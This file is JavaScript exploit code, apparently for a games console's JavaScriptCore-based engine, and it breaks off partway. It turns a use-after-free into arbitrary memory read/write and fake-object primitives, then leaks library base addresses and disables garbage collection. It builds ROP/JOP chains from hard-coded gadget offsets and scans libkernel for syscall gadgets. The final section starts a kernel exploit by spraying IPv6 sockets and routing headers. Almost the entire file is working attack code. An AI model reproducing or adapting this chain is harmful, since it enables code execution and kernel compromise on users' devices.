include('util.js')
include('globals.js')

// UAF exploit starts here

// needed for rw primitives
var prim_uaf_idx = -1
var prim_spray_idx = -1
var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array

// store Uint32Array structure ids to be used for fake master id later
var structs = new Array(0x100)

// used for rw primitives
var master, slave

// rw primitive leak addresses
var leak_obj, leak_obj_addr, master_addr

// spray Uint32Array structure ids
for (var i = 0; i < structs.length; i++) {
  structs[i] = new Uint32Array(1)
  structs[i][`spray_${i}`] = 0x1337
}

log('Initiate UAF...')

var uaf_arr = new Uint32Array(0x80000)

// fake m_hashAndFlags
uaf_arr[4] = 0xB0

make_uaf(uaf_arr)

log('Achieved UAF !!')

log('Spraying arrays with marker...')
// spray candidates arrays to be used as leak primitive
var spray = new Array(0x1000)
for (var i = 0; i < spray.length; i++) {
  spray[i] = [prim_marker.jsv().d(), {}]
}

log('Looking for marked array...')
// find sprayed candidate by marker then corrupt its length
for (var i = 0; i < uaf_arr.length; i += 2) {
  var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
  if (val.eq(prim_marker)) {
    log(`Found marker at uaf_arr[${i}] !!`)

    prim_uaf_idx = i - 2

    log(`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)

    log('Corrupting marked array length...')
    // corrupt indexing header
    uaf_arr[prim_uaf_idx] = 0x1337
    uaf_arr[prim_uaf_idx + 1] = 0x1337
    break
  }
}

if (prim_uaf_idx === -1) {
  jsmaf.exit()
  throw new Error('Failed to find marked array !!')
}

// find index of corrupted array
for (var i = 0; i < spray.length; i++) {
  if (spray[i].length === 0x1337) {
    log(`Found corrupted array at spray[${i}] !!`)
    log(`Corrupted array length ${new BigInt(0, spray[i].length)}`)

    prim_spray_idx = i
    break
  }
}

if (prim_spray_idx === -1) {
  throw new Error('Failed to find corrupted array !!')
}

log('Initiate RW primitives...')

var prim_uaf_obj_idx = prim_uaf_idx + 4

slave = new Uint32Array(0x1000)
slave[0] = 0x13371337

// leak address of leak_obj
leak_obj = { obj: slave }

spray[prim_spray_idx][1] = leak_obj

leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])

// try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
var structure_id = 0x80
while (!(master instanceof Uint32Array)) {
  var rw_obj = {
    js_cell: new BigInt(0x1182300, structure_id++).jsv().d(),
    butterfly: 0,
    vector: slave,
    length_and_flags: 0x1337
  }

  spray[prim_spray_idx][1] = rw_obj

  var rw_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])

  rw_obj_addr = rw_obj_addr.add(new BigInt(0, 0x10))

  uaf_arr[prim_uaf_obj_idx] = rw_obj_addr.lo()
  uaf_arr[prim_uaf_obj_idx + 1] = rw_obj_addr.hi()

  master = spray[prim_spray_idx][1]
}

master_addr = new BigInt(master[5], master[4])

log(`master_addr: ${master_addr}`)
log('Achieved RW primitives !!')

var mem = {
  read8: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(slave[1], slave[0])
    return retval
  },
  read4: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(0, slave[0])
    return retval
  },
  write8: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    if (val instanceof BigInt) {
      slave[0] = val.lo()
      slave[1] = val.hi()
    } else {
      slave[0] = val
      slave[1] = 0
    }
  },
  write4: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    slave[0] = val
  },
  write1: function (addr, val) {
    var byte_val = (val instanceof BigInt) ? val.lo() : val
    var offset = addr.lo() & 3
    var aligned_addr = new BigInt(addr.hi(), addr.lo() & ~3)

    // Read current 4-byte value at aligned address
    master[4] = aligned_addr.lo()
    master[5] = aligned_addr.hi()
    var current = slave[0]

    // Modify the specific byte
    var mask = 0xFF << (offset * 8)
    var new_val = (current & ~mask) | ((byte_val & 0xFF) << (offset * 8))

    // Write back the modified 4-byte value
    slave[0] = new_val
  },
  addrof: function (obj) {
    leak_obj.obj = obj
    return mem.read8(leak_obj_addr.add(new BigInt(0, 0x10)))
  },
  fakeobj: function (addr) {
    mem.write8(leak_obj_addr.add(new BigInt(0, 0x10)), addr)
    return leak_obj.obj
  },
  malloc: function (count) {
    var buf = new Uint8Array(count)
    var backing = mem.backing(buf)
    allocs.set(backing, buf)
    return backing
  },
  free: function (addr) {
    if (allocs.has(addr)) {
      allocs.delete(addr)
    }
  },
  free_all () {
    allocs.clear()
  },
  cstr: function (str) {
    var bytes = new Uint8Array(str.length + 1)

    for (var i = 0; i < str.length; i++) {
      bytes[i] = str.charCodeAt(i) & 0xFF
    }

    bytes[str.length] = 0

    var backing = mem.backing(bytes)
    allocs.set(backing, bytes)
    return backing
  },
  backing (buf) {
    return mem.read8(mem.addrof(buf).add(new BigInt(0, 0x10)))
  }
}

var math_min_addr = mem.addrof(Math.min)
log(`addrof(Math.min): ${math_min_addr}`)

var class_info = mem.read8(math_min_addr.add(new BigInt(0, 0x10)))
log(`class_info: ${class_info}`)

var native_executable = mem.read8(math_min_addr.add(new BigInt(0, 0x18)))
log(`native_executable: ${native_executable}`)

var native_executable_function = mem.read8(native_executable.add(new BigInt(0, 0x40)))
log(`native_executable_function: ${native_executable_function}`)

var native_executable_constructor = mem.read8(native_executable.add(new BigInt(0, 0x48)))
log(`native_executable_constructor: ${native_executable_constructor}`)

var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380))

var _error_addr = mem.read8(base_addr.add(new BigInt(0, 0x1E72398)))
log(`_error_addr: ${_error_addr}`)

var strerror_addr = mem.read8(base_addr.add(new BigInt(0, 0x1E723B8)))
log(`strerror_addr: ${strerror_addr}`)

var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410))

var _read_addr = mem.read8(libc_addr.add(new BigInt(0, 0xDBD30)))
log(`_read_addr: ${_read_addr}`)

var syscall_fn_addr = _read_addr.add(new BigInt(0, 7))
log(`syscall_fn_addr: ${syscall_fn_addr}`)

var sceKernelGetModuleInfoFromAddr_ptr = mem.read8(libc_addr.add(new BigInt(0, 0xDBDA8)))
log(`sceKernelGetModuleInfoFromAddr_ptr: ${sceKernelGetModuleInfoFromAddr_ptr}`)

var jsmaf_gc_addr = mem.addrof(jsmaf.gc)
log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)

var native_invoke_addr = mem.read8(jsmaf_gc_addr.add(new BigInt(0, 0x18)))
log(`native_invoke_addr: ${native_invoke_addr}`)

var eboot_addr = native_invoke_addr.sub(new BigInt(0, 0x39330))

var curl_easy_init_addr = mem.read8(eboot_addr.add(new BigInt(0, 0x3C7D18)))

var libcurl_addr = curl_easy_init_addr.sub(new BigInt(0, 0x78C0))

log(`base_addr: ${base_addr}`)
log(`libc_addr: ${libc_addr}`)
log(`libcurl_addr: ${libcurl_addr}`)
log(`eboot_addr: ${eboot_addr}`)

// Disable GC by patching JSC global variable
// disableGC offset: 0x2275B20 (Ghidra) - 0x400000 (image base) = 0x1E75B20
var DISABLE_GC_OFFSET = 0x1E75B20
var disable_gc_addr = base_addr.add(new BigInt(0, DISABLE_GC_OFFSET))
var gc_old_value = mem.read4(disable_gc_addr)
log('[GC] Current disableGC: ' + gc_old_value.toString())
mem.write4(disable_gc_addr, new BigInt(0, 1))
var gc_new_value = mem.read4(disable_gc_addr)
log('[GC] New disableGC: ' + gc_new_value.toString())
if (gc_new_value.lo() === 1) {
  log('[GC] Successfully disabled GC')
}

var gadgets = {
  RET: base_addr.add(new BigInt(0, 0x4C)),
  POP_R10_RET: base_addr.add(new BigInt(0, 0x19E297C)),
  POP_R12_RET: base_addr.add(new BigInt(0, 0x3F3231)),
  POP_R14_RET: base_addr.add(new BigInt(0, 0x15BE0A)),
  POP_R15_RET: base_addr.add(new BigInt(0, 0x93CD7)),
  POP_R8_RET: base_addr.add(new BigInt(0, 0x19BFF1)),
  POP_R9_JO_RET: base_addr.add(new BigInt(0, 0x72277C)),
  POP_RAX_RET: base_addr.add(new BigInt(0, 0x54094)),
  POP_RBP_RET: base_addr.add(new BigInt(0, 0xC7)),
  POP_RBX_RET: base_addr.add(new BigInt(0, 0x9D314)),
  POP_RCX_RET: base_addr.add(new BigInt(0, 0x2C3DF3)),
  POP_RDI_RET: base_addr.add(new BigInt(0, 0x93CD8)),
  POP_RDX_RET: base_addr.add(new BigInt(0, 0x3A3DA2)),
  POP_RSI_RET: base_addr.add(new BigInt(0, 0xCFEFE)),
  POP_RSP_RET: base_addr.add(new BigInt(0, 0xC89EE)),
  LEAVE_RET: base_addr.add(new BigInt(0, 0x50C33)),
  MOV_RAX_QWORD_PTR_RDI_RET: base_addr.add(new BigInt(0, 0x36073)),
  MOV_QWORD_PTR_RDI_RAX_RET: base_addr.add(new BigInt(0, 0x27FD0)),
  MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40: base_addr.add(new BigInt(0, 0x46E8F0)),
  PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18: base_addr.add(new BigInt(0, 0x3F6F70)),
  MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: base_addr.add(new BigInt(0, 0x18B3B5)),
  PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22: base_addr.add(new BigInt(0, 0x1E25AA1)),
  PUSH_RBP_POP_RCX_RET: base_addr.add(new BigInt(0, 0x1737EEE)),
  MOV_RAX_RCX_RET: base_addr.add(new BigInt(0, 0x41015)),
  PUSH_RAX_POP_RBP_RET: base_addr.add(new BigInt(0, 0x4E82B9))
}

var rop = {
  idx: 0,
  stack_addr: mem.malloc(0x5000),
  ret_buf_addr: mem.malloc(8),
  jop_stack_store: mem.malloc(8),
  jop_stack_addr: mem.malloc(0x6A),
  fake_func: null,
  clear: function () {
    rop.idx = 0

    for (var i = 0; i < 0xA00; i++) {
      mem.write8(rop.stack_addr.add(new BigInt(0, i * 8)), BigInt.Zero)
    }
  },
  push: function (val) {
    if (rop.idx > 0x5000) {
      throw new Error('Stack full !!')
    }

    mem.write8(rop.stack_addr.add(new BigInt(0, rop.idx)), val)
    rop.idx += 8
  },
  execute: function (insts, store_addr, store_size) {
    if (store_size % 8 !== 0) {
      throw new Error('Invalid store, not aligned by 8 bytes')
    }

    if (store_size < 8) {
      throw new Error('Invalid store, minimal size is 8 to store RSP')
    }

    // Reset index but don't zero memory - JSC may reference it
    rop.idx = 0

    var header = []

    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
    header.push(gadgets.MOV_RAX_RCX_RET)
    rop.store(header, store_addr, 0)

    var footer = []

    rop.load(footer, store_addr, 0)
    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
    footer.push(gadgets.POP_RAX_RET)
    footer.push(new BigInt(0, 0xa)) // JSValue for undefined
    footer.push(gadgets.LEAVE_RET)

    insts = header.concat(insts).concat(footer)

    for (var i = 0; i < insts.length; i++) {
      rop.push(insts[i])
    }

    // Reuse pre-allocated JOP structures
    var jop_stack_base_addr = rop.jop_stack_addr.add(new BigInt(0, 0x22))

    mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
    mem.write8(jop_stack_base_addr, rop.stack_addr)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x10)), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x18)), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x40)), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)

    mem.write8(rop.jop_stack_store, jop_stack_base_addr)

    // Create fake function only once
    if (rop.fake_func === null) {
      rop.fake_func = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
    }

    rop.fake_func(0, 0, 0, mem.fakeobj(rop.jop_stack_store))

    // Restore leak_obj to valid state - JSC may access it
    leak_obj.obj = {}

    // Don't free - structures are reused across executions
    // Don't clear ROP stack either - JSC may still reference it
    // rop.clear()
  },
  fake_builtin: function (addr) {
    function fake () {}

    var fake_native_executable = mem.malloc(0x60)
    for (var i = 0; i < 0x60; i += 8) {
      var val = mem.read8(native_executable.add(new BigInt(0, i)))
      mem.write8(fake_native_executable.add(new BigInt(0, i)), val)
    }

    mem.write8(fake_native_executable.add(new BigInt(0, 0x40)), addr)

    var fake_addr = mem.addrof(fake)

    mem.write8(fake_addr.add(new BigInt(0, 0x10)), class_info)
    mem.write8(fake_addr.add(new BigInt(0, 0x18)), fake_native_executable)

    fake.executable = fake_native_executable

    return fake
  },
  store (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(new BigInt(0, index * 8)))
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
  },
  load (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(new BigInt(0, index * 8)))
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
  }
}

var fn = {
  register: function (input, name, ret) {
    if (name in this) {
      throw new Error(`${name} already registered in fn !!`)
    }

    var id
    var addr
    var syscall = false
    if (input instanceof BigInt) {
      addr = input
    } else if (typeof input === 'number') {
      id = new BigInt(0, input)
      addr = syscall_fn_addr
      syscall = true
    }

    var f = function () {
      if (arguments.length > 6) {
        throw new Error('More than 6 arguments is not supported !!')
      }

      var ctx = []
      var insts = []

      // For syscalls: RDI, RSI, RDX, R10, R8, R9 (R10 not RCX because syscall clobbers RCX)
      // For functions: RDI, RSI, RDX, RCX, R8, R9
      var regs = syscall
        ? [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_R10_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
        : [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]

      insts.push(gadgets.POP_RAX_RET)
      insts.push(syscall ? id : BigInt.Zero)

      for (var i = 0; i < arguments.length; i++) {
        var reg = regs[i]
        var value = arguments[i]

        insts.push(reg)

        switch (typeof value) {
          case 'boolean':
            value = new BigInt(value)
            break
          case 'string':
            value = mem.cstr(value)
            ctx.push(value)
            break
          default:
            if (!(value instanceof BigInt)) {
              throw new Error(`Invalid value at arg ${i}`)
            }
            break
        }

        insts.push(value)
      }

      insts.push(addr)

      var store_size = ret ? 0x10 : 8
      var store_addr = mem.malloc(store_size)

      if (ret) {
        rop.store(insts, store_addr, 1)
      }

      rop.execute(insts, store_addr, store_size)

      while (ctx.length > 0) {
        mem.free(ctx.pop())
      }

      var out = mem.read8(store_addr.add(new BigInt(0, 8)))

      mem.free(store_addr)

      return out
    }

    Object.defineProperty(f, 'addr', { value: addr })

    fn[name] = f
  },
  unregister (name) {
    if (!(name in this)) {
      log(`${name} not registered in fn !!`)
      return false
    }

    delete fn[name]

    return true
  }
}

var funcs = [
  { input: libc_addr.add(new BigInt(0, 0x6CA00)), name: 'setjmp', ret: true },
  { input: libc_addr.add(new BigInt(0, 0x6CA50)), name: 'longjmp', ret: false },
  { input: libc_addr.add(new BigInt(0, 0x5F0)), name: 'sceKernelGetModuleInfoForUnwind', ret: true },
  { input: 0x14, name: 'getpid', ret: true },
  { input: 0x29, name: 'dup', ret: true },
  { input: 0x18, name: 'getuid', ret: true },
  { input: 0x19, name: 'geteuid', ret: true },
  { input: 0x74, name: 'gettimeofday', ret: true },
  { input: libc_addr.add(new BigInt(0, 0x6C6F0)), name: 'strlen', ret: true },
  { input: libc_addr.add(new BigInt(0, 0x3E430)), name: 'printf', ret: true },
]

for (var i = 0; i < funcs.length; i++) {
  var func = funcs[i]
  fn.register(func.input, func.name, func.ret)
}

var module_info_buf = mem.malloc(0x300)
var store_size = 0x10
var store_addr = mem.malloc(store_size)

var insts = []

insts.push(gadgets.POP_RDI_RET)
insts.push(sceKernelGetModuleInfoFromAddr_ptr)
insts.push(gadgets.POP_RSI_RET)
insts.push(new BigInt(0, 0x1))
insts.push(gadgets.POP_RDX_RET)
insts.push(module_info_buf)
insts.push(sceKernelGetModuleInfoFromAddr_ptr)

rop.store(insts, store_addr, 1)

try {
  rop.execute(insts, store_addr, store_size)
  var ret_val = mem.read8(store_addr.add(new BigInt(0, 8)))

  if (ret_val.lo() === 0) {
    var libkernel_base = mem.read8(module_info_buf.add(new BigInt(0, 0x160)))
    var segment_count = mem.read4(module_info_buf.add(new BigInt(0, 0x1A0))).lo()

    var libkernel_size = 0
    for (var s = 0; s < segment_count; s++) {
      var seg_offset = 0x160 + (s * 16)
      var seg_size = mem.read4(module_info_buf.add(new BigInt(0, seg_offset + 8))).lo()
      libkernel_size += seg_size
    }

    log('libkernel_base: ' + libkernel_base.toString())
    log('libkernel_size: 0x' + libkernel_size.toString(16))

    mem.free(store_addr)
    mem.free(module_info_buf)
    log('Scanning for Syscall Gadgets...')

    var pattern = [0x48, 0xC7, 0xC0, -1, -1, -1, -1, 0x49, 0x89, 0xCA, 0x0F, 0x05, 0x72, 0x01, 0xC3]
    var scan_size = libkernel_size
    var chunk_size = 0x200
    var num_chunks = Math.floor(scan_size / chunk_size)

    var matches_found = 0
    var syscall_gadgets = {}
    var base_lo = libkernel_base.lo()
    var base_hi = libkernel_base.hi()
    var chunk_data = new Array(chunk_size)
    var found_addrs_lo = new Array(600)
    var found_addrs_hi = new Array(600)
    var found_syscalls = new Array(600)
    var found_count = 0

    for (var chunk = 0; chunk < num_chunks; chunk++) {
      try {
        var chunk_offset = chunk * chunk_size

        var addr_lo = base_lo + chunk_offset
        var addr_hi = base_hi
        if (addr_lo >= 0x100000000) {
          addr_lo -= 0x100000000
          addr_hi++
        }

        for (var c = 0; c < chunk_size; c++) {
          chunk_data[c] = -1
        }

        var read_lo, read_hi, low_dword, high_dword
        for (var q = 0; q < chunk_size; q += 8) {
          try {
            read_lo = addr_lo + q
            read_hi = addr_hi
            if (read_lo >= 0x100000000) {
              read_lo -= 0x100000000
              read_hi++
            }

            master[4] = read_lo
            master[5] = read_hi

            low_dword = slave[0]
            high_dword = slave[1]

            chunk_data[q] = low_dword & 0xFF
            chunk_data[q + 1] = (low_dword >>> 8) & 0xFF
            chunk_data[q + 2] = (low_dword >>> 16) & 0xFF
            chunk_data[q + 3] = (low_dword >>> 24) & 0xFF
            chunk_data[q + 4] = high_dword & 0xFF
            chunk_data[q + 5] = (high_dword >>> 8) & 0xFF
            chunk_data[q + 6] = (high_dword >>> 16) & 0xFF
            chunk_data[q + 7] = (high_dword >>> 24) & 0xFF
          } catch (e) {
            chunk_data[q] = -1
            chunk_data[q + 1] = -1
            chunk_data[q + 2] = -1
            chunk_data[q + 3] = -1
            chunk_data[q + 4] = -1
            chunk_data[q + 5] = -1
            chunk_data[q + 6] = -1
            chunk_data[q + 7] = -1
          }
        }

        var match, expected, syscall_num, gadget_offset, gadget_lo, gadget_hi
        for (var i = 0; i < chunk_size - pattern.length; i++) {
          match = true

          for (var p = 0; p < pattern.length; p++) {
            expected = pattern[p]
            if (expected !== -1) {
              if (chunk_data[i + p] === -1 || chunk_data[i + p] !== expected) {
                match = false
                break
              }
            }
          }

          if (match) {
            syscall_num = (chunk_data[i + 3] & 0xFF) |
                          ((chunk_data[i + 4] & 0xFF) << 8) |
                          ((chunk_data[i + 5] & 0xFF) << 16) |
                          ((chunk_data[i + 6] & 0xFF) << 24)

            if (syscall_num >= 0 && !syscall_gadgets[syscall_num]) {
              gadget_offset = chunk_offset + i
              gadget_lo = base_lo + gadget_offset
              gadget_hi = base_hi
              if (gadget_lo >= 0x100000000) {
                gadget_lo -= 0x100000000
                gadget_hi++
              }

              found_addrs_lo[found_count] = gadget_lo
              found_addrs_hi[found_count] = gadget_hi
              found_syscalls[found_count] = syscall_num
              found_count++
              syscall_gadgets[syscall_num] = true
              matches_found++
            }
          }
        }
      } catch (e) {
        // Silent
      }
    }

    log('')
    log('Found ' + matches_found + ' syscall gadgets')

    var kapi = {
      read_lo: 0,
      read_hi: 0,
      read_found: false,
      write_lo: 0,
      write_hi: 0,
      write_found: false,
      close_lo: 0,
      close_hi: 0,
      close_found: false,
      getpid_lo: 0,
      getpid_hi: 0,
      getpid_found: false,
      setuid_lo: 0,
      setuid_hi: 0,
      setuid_found: false,
      recvmsg_lo: 0,
      recvmsg_hi: 0,
      recvmsg_found: false,
      pipe_lo: 0,
      pipe_hi: 0,
      pipe_found: false,
      ioctl_lo: 0,
      ioctl_hi: 0,
      ioctl_found: false,
      dup_lo: 0,
      dup_hi: 0,
      dup_found: false,
      socket_lo: 0,
      socket_hi: 0,
      socket_found: false,
      setsockopt_lo: 0,
      setsockopt_hi: 0,
      setsockopt_found: false,
      getsockopt_lo: 0,
      getsockopt_hi: 0,
      getsockopt_found: false,
      readv_lo: 0,
      readv_hi: 0,
      readv_found: false,
      writev_lo: 0,
      writev_hi: 0,
      writev_found: false,
      socketpair_lo: 0,
      socketpair_hi: 0,
      socketpair_found: false,
      kqueue_lo: 0,
      kqueue_hi: 0,
      kqueue_found: false,
      getuid_lo: 0,
      getuid_hi: 0,
      getuid_found: false
    }

    for (var f = 0; f < found_count; f++) {
      var syscall_num = found_syscalls[f]
      var lo = found_addrs_lo[f]
      var hi = found_addrs_hi[f]

      if (syscall_num === 0x03) {
        kapi.read_lo = lo
        kapi.read_hi = hi
        kapi.read_found = true
      } else if (syscall_num === 0x04) {
        kapi.write_lo = lo
        kapi.write_hi = hi
        kapi.write_found = true
      } else if (syscall_num === 0x06) {
        kapi.close_lo = lo
        kapi.close_hi = hi
        kapi.close_found = true
      } else if (syscall_num === 0x14) {
        kapi.getpid_lo = lo
        kapi.getpid_hi = hi
        kapi.getpid_found = true
      } else if (syscall_num === 0x17) {
        kapi.setuid_lo = lo
        kapi.setuid_hi = hi
        kapi.setuid_found = true
      } else if (syscall_num === 0x18) {
        kapi.getuid_lo = lo
        kapi.getuid_hi = hi
        kapi.getuid_found = true
      } else if (syscall_num === 0x1B) {
        kapi.recvmsg_lo = lo
        kapi.recvmsg_hi = hi
        kapi.recvmsg_found = true
      } else if (syscall_num === 0x29) {
        kapi.dup_lo = lo
        kapi.dup_hi = hi
        kapi.dup_found = true
      } else if (syscall_num === 0x2A) {
        kapi.pipe_lo = lo
        kapi.pipe_hi = hi
        kapi.pipe_found = true
      } else if (syscall_num === 0x36) {
        kapi.ioctl_lo = lo
        kapi.ioctl_hi = hi
        kapi.ioctl_found = true
      } else if (syscall_num === 0x61) {
        kapi.socket_lo = lo
        kapi.socket_hi = hi
        kapi.socket_found = true
      } else if (syscall_num === 0x69) {
        kapi.setsockopt_lo = lo
        kapi.setsockopt_hi = hi
        kapi.setsockopt_found = true
      } else if (syscall_num === 0x76) {
        kapi.getsockopt_lo = lo
        kapi.getsockopt_hi = hi
        kapi.getsockopt_found = true
      } else if (syscall_num === 0x78) {
        kapi.readv_lo = lo
        kapi.readv_hi = hi
        kapi.readv_found = true
      } else if (syscall_num === 0x79) {
        kapi.writev_lo = lo
        kapi.writev_hi = hi
        kapi.writev_found = true
      } else if (syscall_num === 0x88) {
        kapi.socketpair_lo = lo
        kapi.socketpair_hi = hi
        kapi.socketpair_found = true
      } else if (syscall_num === 0x16E) {
        kapi.kqueue_lo = lo
        kapi.kqueue_hi = hi
        kapi.kqueue_found = true
      }
    }

    // Test getuid syscall (0x18)
    log('')
    log('Testing getuid syscall...')

    if (kapi.getuid_found) {
      var test_store_addr = mem.malloc(0x10)
      var getuid_wrapper = new BigInt(kapi.getuid_hi, kapi.getuid_lo)
      var test_insts = build_rop_chain(getuid_wrapper)

      rop.store(test_insts, test_store_addr, 1)

      try {
        rop.execute(test_insts, test_store_addr, 0x10)
        var uid = mem.read8(test_store_addr.add(new BigInt(0, 8)))
        log('getuid returned: ' + uid.lo())
        mem.free(test_store_addr)
      } catch (e) {
        log('ERROR: getuid test failed - ' + e.message)
        mem.free(test_store_addr)
      }
    } else {
      log('WARNING: getuid wrapper not found')
    }

    // Test dup syscall (0x29)
    log('')
    log('Testing dup syscall...')

    if (kapi.dup_found) {
      var dup_store_addr = mem.malloc(0x10)
      var dup_wrapper = new BigInt(kapi.dup_hi, kapi.dup_lo)
      var dup_insts = build_rop_chain(dup_wrapper, new BigInt(0, 1))

      rop.store(dup_insts, dup_store_addr, 1)

      try {
        rop.execute(dup_insts, dup_store_addr, 0x10)
        var new_fd = mem.read8(dup_store_addr.add(new BigInt(0, 8)))
        log('dup(1) returned: ' + new_fd.lo())
        mem.free(dup_store_addr)
      } catch (e) {
        log('ERROR: dup test failed - ' + e.message)
        mem.free(dup_store_addr)
      }
    } else {
      log('WARNING: dup wrapper not found')
    }
  } else {
    log('ERROR: sceKernelGetModuleInfoFromAddr failed with code: ' + ret_val.lo())
    mem.free(store_addr)
    mem.free(module_info_buf)
  }
} catch (e) {
  log('')
  log('ERROR: ROP execution failed - ' + e.message)
  mem.free(store_addr)
  mem.free(module_info_buf)
}

// ============================================================================
// NetControl Kernel Exploit (NetControl port based on TheFl0ws Java impl)
// ============================================================================

log('')
log('=== NetControl Kernel Exploit ===')

// Check required syscalls
if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found) {
  log('ERROR: Required syscalls not found')
  log('  socket: ' + kapi.socket_found)
  log('  setsockopt: ' + kapi.setsockopt_found)
  log('  getsockopt: ' + kapi.getsockopt_found)
  log('  close: ' + kapi.close_found)
} else {
  log('All required syscalls found')

  // Storage for IPv6 sockets
  var ipv6_sockets = new Int32Array(IPV6_SOCK_NUM)
  var socket_count = 0

  // Pre-allocate buffers
  var rthdr_buf = mem.malloc(UCRED_SIZE)
  var optlen_buf = mem.malloc(8)

  log('')
  log('[SOCKET] Creating ' + IPV6_SOCK_NUM + ' IPv6 sockets...')

  // Create 64 IPv6 sockets
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    var socket_wrapper = new BigInt(kapi.socket_hi, kapi.socket_lo)
    var socket_store_addr = mem.malloc(0x10)
    var socket_insts = build_rop_chain(
      socket_wrapper,
      new BigInt(0, AF_INET6),
      new BigInt(0, SOCK_STREAM),
      new BigInt(0, 0)
    )
    rop.store(socket_insts, socket_store_addr, 1)

    try {
      rop.execute(socket_insts, socket_store_addr, 0x10)
      var fd = mem.read8(socket_store_addr.add(new BigInt(0, 8)))
      mem.free(socket_store_addr)

      if (fd.hi() === 0xFFFFFFFF) {
        log('[SOCKET] ERROR: socket() failed at index ' + i)
        break
      }

      ipv6_sockets[i] = fd.lo()
      socket_count++

      if (i % 10 === 0) {
        log('[SOCKET] Created socket ' + i + '/' + IPV6_SOCK_NUM + ', fd=' + fd.lo())
      }
    } catch (e) {
      log('[SOCKET] ERROR: Failed to create socket ' + i + ' - ' + e.message)
      mem.free(socket_store_addr)
      break
    }
  }

  log('[SOCKET] Created ' + socket_count + ' sockets')

  if (socket_count === IPV6_SOCK_NUM) {
    log('')
    log('[INIT] Initializing pktopts on all sockets...')

    // Debug: check if required variables are defined
    if (typeof IPPROTO_IPV6 === 'undefined') {
      log('ERROR: IPPROTO_IPV6 is undefined - check globals.js is loaded')
    }
    if (typeof IPV6_RTHDR === 'undefined') {
      log('ERROR: IPV6_RTHDR is undefined - check globals.js is loaded')
    }
    if (typeof kapi === 'undefined') {
      log('ERROR: kapi is undefined')
    } else if (!kapi.setsockopt_found) {
      log('ERROR: setsockopt wrapper not found')
    }

    // Initialize pktopts by calling setsockopt with NULL buffer (freeRthdr)
    var init_count = 0
    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
      var init_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
      var init_store_addr = mem.malloc(0x10)
      var init_insts = build_rop_chain(
        init_wrapper,
        new BigInt(0, ipv6_sockets[i]),
        new BigInt(0, IPPROTO_IPV6),
        new BigInt(0, IPV6_RTHDR),
        new BigInt(0, 0), // NULL buffer
        new BigInt(0, 0)  // size 0
      )
      rop.store(init_insts, init_store_addr, 1)

      try {
        rop.execute(init_insts, init_store_addr, 0x10)
        var ret = mem.read8(init_store_addr.add(new BigInt(0, 8)))
        mem.free(init_store_addr)

        if (ret.hi() !== 0xFFFFFFFF || ret.lo() !== 0xFFFFFFFF) {
          init_count++
        }
      } catch (e) {
        log('[INIT] ERROR: Exception at socket ' + i + ': ' + e.message)
        mem.free(init_store_addr)
        break
      }
    }

    log('[INIT] Initialized ' + init_count + ' pktopts structures')

    if (init_count > 0) {
      log('')
      log('[SPRAY] Spraying routing headers...')

      // Build routing header in buffer - exactly like poop.java buildRthdr()
      var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
      var rthdr_size = (rthdr_len + 1) << 3

      // Zero out buffer first
      for (var z = 0; z < UCRED_SIZE; z += 4) {
        mem.write4(rthdr_buf.add(new BigInt(0, z)), new BigInt(0, 0))
      }

      // Write header bytes individually - exactly like poop.java putByte()
      mem.write1(rthdr_buf.add(new BigInt(0, 0)), 0)                  // buf.putByte(0x00, (byte) 0)
      mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len)          // buf.putByte(0x01, (byte) len)
